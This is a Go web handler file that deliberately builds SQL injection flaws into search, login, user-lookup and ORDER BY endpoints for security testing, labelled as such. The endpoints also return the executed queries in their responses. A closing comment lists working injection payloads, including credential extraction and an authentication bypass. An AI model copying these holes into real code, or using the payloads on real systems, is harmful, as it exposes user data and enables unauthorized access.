package handlers

import (
	"fmt"
	"net/http"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

// VulnerableHandler - INTENTIONALLY VULNERABLE for testing purposes
// DO NOT USE IN PRODUCTION - This is for security testing only
type VulnerableHandler struct {
	db *gorm.DB
}

func NewVulnerableHandler(db *gorm.DB) *VulnerableHandler {
	return &VulnerableHandler{
		db: db,
	}
}

// VulnerableSearch - INTENTIONALLY VULNERABLE SQL injection endpoint
// This demonstrates what NOT to do in production code
func (h *VulnerableHandler) VulnerableSearch(c *gin.Context) {
	query := c.Query("q")
	if query == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Search query is required"})
		return
	}

	// VULNERABLE CODE - DO NOT USE IN PRODUCTION
	// This concatenates user input directly into SQL query
	sqlQuery := fmt.Sprintf("SELECT * FROM products WHERE name LIKE '%%%s%%' OR description LIKE '%%%s%%'", query, query)

	var results []map[string]interface{}

	// Execute raw SQL with user input - VULNERABLE TO SQL INJECTION
	err := h.db.Raw(sqlQuery).Scan(&results).Error
	if err != nil {
		// Don't expose internal errors in production
		c.JSON(http.StatusInternalServerError, gin.H{
			"error":  "Database error occurred",
			"query":  sqlQuery, // NEVER expose actual query in production
			"detail": err.Error(),
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"results":        results,
		"query_executed": sqlQuery, // NEVER expose this in production
	})
}

// VulnerableLogin - INTENTIONALLY VULNERABLE authentication bypass
func (h *VulnerableHandler) VulnerableLogin(c *gin.Context) {
	var loginReq struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := c.ShouldBindJSON(&loginReq); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// VULNERABLE CODE - String concatenation in WHERE clause
	sqlQuery := fmt.Sprintf("SELECT id, username, email FROM users WHERE username = '%s' AND password = '%s'",
		loginReq.Username, loginReq.Password)

	var user map[string]interface{}
	err := h.db.Raw(sqlQuery).First(&user).Error

	if err != nil {
		if err == gorm.ErrRecordNotFound {
			c.JSON(http.StatusUnauthorized, gin.H{
				"error":          "Invalid credentials",
				"query_executed": sqlQuery, // NEVER expose this
			})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{
			"error":  "Database error",
			"detail": err.Error(),
			"query":  sqlQuery, // NEVER expose this
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"message":        "Login successful",
		"user":           user,
		"query_executed": sqlQuery, // NEVER expose this
	})
}

// VulnerableGetUser - INTENTIONALLY VULNERABLE user lookup
func (h *VulnerableHandler) VulnerableGetUser(c *gin.Context) {
	userID := c.Param("id")

	// VULNERABLE: Direct string concatenation
	sqlQuery := "SELECT * FROM users WHERE id = " + userID

	var user map[string]interface{}
	err := h.db.Raw(sqlQuery).First(&user).Error

	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{
			"error":          "User not found",
			"query_executed": sqlQuery, // NEVER expose this
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"user":           user,
		"query_executed": sqlQuery, // NEVER expose this
	})
}

// VulnerableOrderBy - INTENTIONALLY VULNERABLE ORDER BY injection
func (h *VulnerableHandler) VulnerableOrderBy(c *gin.Context) {
	orderBy := c.DefaultQuery("order_by", "name")
	direction := c.DefaultQuery("direction", "ASC")

	// VULNERABLE: No validation of ORDER BY parameters
	sqlQuery := fmt.Sprintf("SELECT * FROM products ORDER BY %s %s", orderBy, direction)

	var products []map[string]interface{}
	err := h.db.Raw(sqlQuery).Scan(&products).Error

	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error":          "Query failed",
			"query_executed": sqlQuery, // NEVER expose this
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"products":       products,
		"query_executed": sqlQuery, // NEVER expose this
	})
}

// RegisterVulnerableRoutes - Register intentionally vulnerable routes for testing
// NEVER USE THESE ROUTES IN PRODUCTION
func (h *VulnerableHandler) RegisterVulnerableRoutes(router *gin.RouterGroup) {
	// Add warning middleware
	router.Use(func(c *gin.Context) {
		c.Header("X-Security-Warning", "INTENTIONALLY VULNERABLE ENDPOINT - FOR TESTING ONLY")
		c.Next()
	})

	vulnerable := router.Group("/vulnerable")
	{
		vulnerable.GET("/search", h.VulnerableSearch)
		vulnerable.POST("/login", h.VulnerableLogin)
		vulnerable.GET("/users/:id", h.VulnerableGetUser)
		vulnerable.GET("/products", h.VulnerableOrderBy)
	}
}

// Demonstration payloads that would work against vulnerable endpoints:
/*

1. Basic SQL Injection (VulnerableSearch):
   GET /vulnerable/search?q=' OR 1=1 --
   Result: Returns all products due to '1=1' always being true

2. UNION-based injection (VulnerableSearch):
   GET /vulnerable/search?q=' UNION SELECT username,password,email FROM users --
   Result: Exposes user credentials

3. Authentication bypass (VulnerableLogin):
   POST /vulnerable/login
   Body: {"username": "admin' --", "password": "anything"}
   Result: Bypasses password check with comment

4. Data extraction (VulnerableGetUser):
   GET /vulnerable/users/1 UNION SELECT username,password FROM users --
   Result: Extracts sensitive user data

5. ORDER BY injection (VulnerableOrderBy):
   GET /vulnerable/products?order_by=(CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN name ELSE price END)
   Result: Conditional logic based on data existence

6. Time-based blind injection:
   GET /vulnerable/search?q=' OR (SELECT COUNT(*) FROM pg_sleep(5)) > 0 --
   Result: Causes 5-second delay if successful

7. Boolean-based blind injection:
   GET /vulnerable/search?q=' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 --
   Result: Different response based on condition truth

*/
